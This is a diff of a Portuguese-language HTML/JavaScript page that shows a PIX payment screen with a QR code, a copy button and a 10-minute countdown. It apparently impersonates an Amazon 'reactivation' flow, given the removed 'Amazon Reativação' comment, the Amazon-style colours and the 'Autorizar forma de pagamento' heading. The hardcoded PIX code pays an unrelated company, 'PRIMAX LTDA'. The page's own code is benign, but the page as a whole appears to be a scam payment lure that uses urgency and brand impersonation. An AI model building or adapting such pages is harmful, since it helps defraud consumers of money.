@@ -1,79 +1,1129 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"
-<!-- Amazon Reativação -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<meta name="theme-color"
+content="#edbb81">
+
+<title>Pagamento PIX</title>
+
+
+<style>
+
+/* ================================
+   CONFIGURAÇÃO GERAL
+================================ */
+
+* {
+    box-sizing: border-box;
+}
+
+html,
+body {
+
+    margin: 0;
+    padding: 0;
+
+    width: 100%;
+    min-height: 100%;
+
+    background: #ffffff;
+
+    color: #111111;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+}
+
+
+/* ================================
+   CABEÇALHO
+================================ */
+
+.top-header {
+
+    width: 100%;
+
+    height: 194px;
+
+    position: relative;
+
+    color: white;
+
+    background:
+        repeating-linear-gradient(
+            90deg,
+            #edbb81 0px,
+            #edbb81 25px,
+            #e5ae72 25px,
+            #e5ae72 31px
+        );
+
+}
+
+
+.header-title {
+
+    position: absolute;
+
+    left: 23px;
+    right: 23px;
+
+    bottom: 34px;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+}
+
+
+.header-title h1 {
+
+    margin: 0;
+
+    text-align: center;
+
+    font-size: 25px;
+
+    line-height: 1.1;
+
+    font-weight: 700;
+
+}
+
+
+.back-arrow {
+
+    position: absolute;
+
+    left: 0;
+
+    top: 50%;
+
+    transform:
+        translateY(-53%);
+
+    font-size: 48px;
+
+    line-height: 1;
+
+    font-weight: 300;
+
+}
+
+
+/* ================================
+   BARRA AZUL
+================================ */
+
+.dark-bar {
+
+    width: 100%;
+
+    height: 107px;
+
+    background: #283442;
+
+}
+
+
+/* ================================
+   ÁREA PRINCIPAL
+================================ */
+
+.payment {
+
+    width: 100%;
+
+    max-width: 1170px;
+
+    margin: 0 auto;
+
+    padding:
+        74px
+        34px
+        70px;
+
+    text-align: center;
+
+}
+
+
+/* ================================
+   VALOR
+================================ */
+
+#amount {
+
+    margin:
+        0
+        0
+        104px;
+
+    font-size: 30px;
+
+    line-height: 1.2;
+
+    font-weight: 700;
+
+}
+
+
+/* ================================
+   QR CODE
+================================ */
+
+.qrcode {
+
+    width:
+        min(
+            292px,
+            72vw
+        );
+
+    height:
+        min(
+            292px,
+            72vw
+        );
+
+    margin:
+        0
+        auto
+        100px;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    overflow: hidden;
+
+}
+
+
+.qrcode svg {
+
+    width: 100%;
+
+    height: 100%;
+
+    display: block;
+
+}
+
+
+/* ================================
+   TÍTULO
+================================ */
+
+.payment h3 {
+
+    margin:
+        0
+        0
+        28px;
+
+    font-size: 25px;
+
+    line-height: 1.2;
+
+    font-weight: 700;
+
+}
+
+
+/* ================================
+   TEXTOS
+================================ */
+
+.payment p {
+
+    margin: 0;
+
+    font-size: 24px;
+
+    line-height: 1.48;
+
+    font-weight: 400;
+
+}
+
+
+.do-not-refresh {
+
+    margin-top:
+        66px !important;
+
+}
+
+
+.remaining {
+
+    margin-top:
+        64px !important;
+
+}
+
+
+/* ================================
+   BOTÃO
+================================ */
+
+.copy-button {
+
+    width: 100%;
+
+    height: 102px;
+
+    margin-top:
+        72px;
+
+    border: 0;
+
+    border-radius: 60px;
+
+    background: #ffd814;
+
+    color: #111111;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    font-size: 30px;
+
+    font-weight: 400;
+
+    cursor: pointer;
+
+    touch-action: manipulation;
+
+    -webkit-tap-highlight-color:
+        transparent;
+
+}
+
+
+.copy-button:active {
+
+    transform:
+        scale(0.995);
+
+}
+
+
+.copy-button:disabled {
+
+    opacity: 0.6;
+
+    cursor: default;
+
+}
+
+
+/* ================================
+   COMPUTADOR
+================================ */
+
+@media (min-width: 701px) {
+
+
+    .top-header {
+
+        height: 274px;
+
+    }
+
+
+    .header-title {
+
+        left: 30px;
+
+        right: 30px;
+
+        bottom: 48px;
+
+    }
+
+
+    .header-title h1 {
+
+        font-size: 43px;
+
+    }
+
+
+    .back-arrow {
+
+        font-size: 64px;
+
+    }
+
+
+    .dark-bar {
+
+        height: 149px;
+
+    }
+
+
+    .payment {
+
+        padding:
+            105px
+            48px
+            120px;
+
+    }
+
+
+    #amount {
+
+        font-size: 41px;
+
+        margin-bottom:
+            125px;
+
+    }
+
+
+    .qrcode {
+
+        width: 410px;
+
+        height: 410px;
+
+        margin-bottom:
+            120px;
+
+    }
+
+
+    .payment h3 {
+
+        font-size: 38px;
+
+        margin-bottom:
+            38px;
+
+    }
+
+
+    .payment p {
+
+        font-size: 35px;
+
+    }
+
+
+    .do-not-refresh {
+
+        margin-top:
+            92px !important;
+
+    }
+
+
+    .remaining {
+
+        margin-top:
+            83px !important;
+
+    }
+
+
+    .copy-button {
+
+        margin-top:
+            90px;
+
+        font-size: 36px;
+
+    }
+
+}
+
+
+/* ================================
+   CELULARES PEQUENOS
+================================ */
+
+@media (max-width: 390px) {
+
+
+    .payment {
+
+        padding-left: 24px;
+
+        padding-right: 24px;
+
+    }
+
+
+    .header-title h1 {
+
+        font-size: 23px;
+
+    }
+
+
+    #amount {
+
+        font-size: 28px;
+
+    }
+
+
+    .payment h3 {
+
+        font-size: 23px;
+
+    }
+
+
+    .payment p {
+
+        font-size: 21px;
+
+    }
+
+
+    .copy-button {
+
+        font-size: 27px;
+
+    }
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<!-- ================================
+     CABEÇALHO
+================================ -->
+
 <header class="top-header">
 
-  <div class="header-title">
+    <div class="header-title">
 
-    <span class="back-arrow" aria-hidden="true">←</span>
+        <span class="back-arrow">
+            ←
+        </span>
 
-    <h1>Autorizar forma de pagamento</h1>
+        <h1>
+            Autorizar forma de pagamento
+        </h1>
 
-  </div>
+    </div>
 
 </header>
 
 
 <!-- BARRA ESCURA -->
+
 <div class="dark-bar"></div>
 
 
-<!-- ÁREA DO PAGAMENTO -->
-<section class="payment">
+<!-- ================================
+     PAGAMENTO
+================================ -->
 
-  <h2 id="amount">
-    Total a pagar: R$ 0,00
-  </h2>
-
-
-  <!-- QR CODE -->
-  <div
-    id="qrcode"
-    class="qrcode"
-    aria-label="QR Code PIX"
-  ></div>
+<main class="payment">
 
 
-  <h3>
-    Escaneie ou copie o código para pagar
-  </h3>
+    <h2 id="amount">
+        Total a pagar: R$ 0,00
+    </h2>
 
 
-  <p>
-    Escaneie o QR code com a câmera do seu celular
-    <br class="desktop-break">
+    <!-- QR CODE -->
 
-    para pagar no aplicativo do seu banco ou copie o
-    <br class="desktop-break">
-
-    código clicando no botão abaixo.
-  </p>
+    <div
+        id="qrcode"
+        class="qrcode">
+    </div>
 
 
-  <p class="do-not-refresh">
-    Não atualize a página.
-  </p>
+    <h3>
+        Escaneie ou copie o código para pagar
+    </h3>
 
 
-  <p class="remaining">
-    Tempo restante:
-    <strong id="timer">10:00</strong>
-  </p>
+    <p>
+
+        Escaneie o QR code com a câmera do seu celular
+
+        <br>
+
+        para pagar no aplicativo do seu banco ou copie o
+
+        <br>
+
+        código clicando no botão abaixo.
+
+    </p>
 
 
-  <!-- BOTÃO COPIAR -->
-  <button
-    id="copyButton"
-    class="copy-button"
-    type="button"
-  >
-    Copiar código
-  </button>
+    <p class="do-not-refresh">
+
+        Não atualize a página.
+
+    </p>
 
 
-  <span
-    id="copyStatus"
-    class="sr-only"
-    aria-live="polite"
-  ></span>
+    <p class="remaining">
 
-</section>
+        Tempo restante:
+
+        <strong id="timer">
+            10:00
+        </strong>
+
+    </p>
+
+
+    <button
+        id="copyButton"
+        class="copy-button"
+        type="button">
+
+        Copiar código
+
+    </button>
+
+
+</main>
+
+
+<!-- BIBLIOTECA QR CODE -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+
+
+<script>
+
+/* ============================================================
+   SEU PIX
+   ============================================================
+
+   PARA TROCAR O PIX NO FUTURO,
+   ALTERE SOMENTE O TEXTO ABAIXO.
+============================================================ */
+
+
+const pixCode =
+"00020101021226910014br.gov.bcb.pix2569qrcode.mtbank.com.br/spi/qr-code/cob/b28be761e85d4477bf7ae28c59adc7545204000053039865802BR5911PRIMAX LTDA6005Cuite61085817500062070503***63047FEB";
+
+
+/* ============================================================
+   ELEMENTOS
+============================================================ */
+
+const amountElement =
+document.getElementById("amount");
+
+const qrElement =
+document.getElementById("qrcode");
+
+const timerElement =
+document.getElementById("timer");
+
+const copyButton =
+document.getElementById("copyButton");
+
+
+/* ============================================================
+   LER CAMPOS PIX
+============================================================ */
+
+function parsePixFields(payload) {
+
+    const fields = {};
+
+    let position = 0;
+
+
+    while (
+        position + 4 <=
+        payload.length
+    ) {
+
+        const id =
+            payload.substring(
+                position,
+                position + 2
+            );
+
+
+        const length =
+            Number(
+                payload.substring(
+                    position + 2,
+                    position + 4
+                )
+            );
+
+
+        if (
+            !Number.isFinite(length)
+        ) {
+
+            break;
+
+        }
+
+
+        const start =
+            position + 4;
+
+
+        const end =
+            start + length;
+
+
+        if (
+            end > payload.length
+        ) {
+
+            break;
+
+        }
+
+
+        fields[id] =
+            payload.substring(
+                start,
+                end
+            );
+
+
+        position =
+            end;
+
+    }
+
+
+    return fields;
+
+}
+
+
+/* ============================================================
+   MOSTRAR VALOR
+============================================================ */
+
+function renderAmount() {
+
+    const fields =
+        parsePixFields(
+            pixCode
+        );
+
+
+    const amount =
+        fields["54"];
+
+
+    if (
+        amount &&
+        Number.isFinite(
+            Number(amount)
+        )
+    ) {
+
+        const formatted =
+            Number(amount)
+            .toLocaleString(
+                "pt-BR",
+                {
+                    style: "currency",
+                    currency: "BRL"
+                }
+            );
+
+
+        amountElement.textContent =
+            "Total a pagar: " +
+            formatted;
+
+    }
+
+    else {
+
+        amountElement.textContent =
+            "Total a pagar: R$ 0,00";
+
+    }
+
+}
+
+
+/* ============================================================
+   GERAR QR CODE
+============================================================ */
+
+function renderQrCode() {
+
+
+    if (
+        typeof qrcode !==
+        "function"
+    ) {
+
+        qrElement.textContent =
+            "Não foi possível gerar o QR Code.";
+
+        return;
+
+    }
+
+
+    try {
+
+
+        const qr =
+            qrcode(
+                0,
+                "M"
+            );
+
+
+        qr.addData(
+            pixCode
+        );
+
+
+        qr.make();
+
+
+        qrElement.innerHTML =
+            qr.createSvgTag({
+
+                cellSize: 5,
+
+                margin: 0,
+
+                scalable: true
+
+            });
+
+
+    }
+
+    catch (error) {
+
+        console.error(
+            error
+        );
+
+
+        qrElement.textContent =
+            "Código PIX inválido.";
+
+    }
+
+}
+
+
+/* ============================================================
+   COPIAR PIX
+============================================================ */
+
+function fallbackCopy(text) {
+
+
+    const textarea =
+        document.createElement(
+            "textarea"
+        );
+
+
+    textarea.value =
+        text;
+
+
+    textarea.style.position =
+        "fixed";
+
+
+    textarea.style.left =
+        "-9999px";
+
+
+    textarea.style.top =
+        "0";
+
+
+    textarea.style.opacity =
+        "0";
+
+
+    document.body.appendChild(
+        textarea
+    );
+
+
+    textarea.focus();
+
+
+    textarea.select();
+
+
+    textarea.setSelectionRange(
+        0,
+        text.length
+    );
+
+
+    const success =
+        document.execCommand(
+            "copy"
+        );
+
+
+    textarea.remove();
+
+
+    if (!success) {
+
+        throw new Error(
+            "Não foi possível copiar"
+        );
+
+    }
+
+}
+
+
+async function copyPix() {
+
+
+    if (
+        Date.now() >=
+        expirationTime
+    ) {
+
+        return;
+
+    }
+
+
+    try {
+
+
+        if (
+            navigator.clipboard &&
+            window.isSecureContext
+        ) {
+
+
+            await navigator.clipboard.writeText(
+                pixCode
+            );
+
+
+        }
+
+        else {
+
+
+            fallbackCopy(
+                pixCode
+            );
+
+        }
+
+
+        showCopied();
+
+
+    }
+
+    catch (error) {
+
+
+        try {
+
+
+            fallbackCopy(
+                pixCode
+            );
+
+
+            showCopied();
+
+
+        }
+
+        catch (error2) {
+
+
+            alert(
+                "Não foi possível copiar o código PIX."
+            );
+
+        }
+
+    }
+
+}
+
+
+/* ============================================================
+   AVISO DE CÓDIGO COPIADO
+============================================================ */
+
+function showCopied() {
+
+
+    const original =
+        copyButton.textContent;
+
+
+    copyButton.textContent =
+        "Código copiado!";
+
+
+    setTimeout(
+        function () {
+
+            copyButton.textContent =
+                original;
+
+        },
+        1600
+    );
+
+}
+
+
+copyButton.addEventListener(
+    "click",
+    copyPix
+);
+
+
+/* ============================================================
+   CONTADOR — 10 MINUTOS
+============================================================ */
+
+const expirationTime =
+    Date.now() +
+    (
+        10 *
+        60 *
+        1000
+    );
+
+
+function updateTimer() {
+
+
+    const remaining =
+        Math.max(
+            0,
+            expirationTime -
+            Date.now()
+        );
+
+
+    const totalSeconds =
+        Math.ceil(
+            remaining /
+            1000
+        );
+
+
+    const minutes =
+        Math.floor(
+            totalSeconds /
+            60
+        );
+
+
+    const seconds =
+        totalSeconds %
+        60;
+
+
+    timerElement.textContent =
+
+        String(minutes)
+        .padStart(2, "0")
+
+        +
+
+        ":"
+
+        +
+
+        String(seconds)
+        .padStart(2, "0");
+
+
+    if (
+        remaining <= 0
+    ) {
+
+
+        timerElement.textContent =
+            "00:00";
+
+
+        copyButton.disabled =
+            true;
+
+
+        clearInterval(
+            timerInterval
+        );
+
+    }
+
+}
+
+
+/* ============================================================
+   INICIAR
+============================================================ */
+
+renderAmount();
+
+renderQrCode();
+
+updateTimer();
+
+
+const timerInterval =
+    setInterval(
+        updateTimer,
+        250
+    );
+
+</script>
+
+
+</body>
+
+</html>
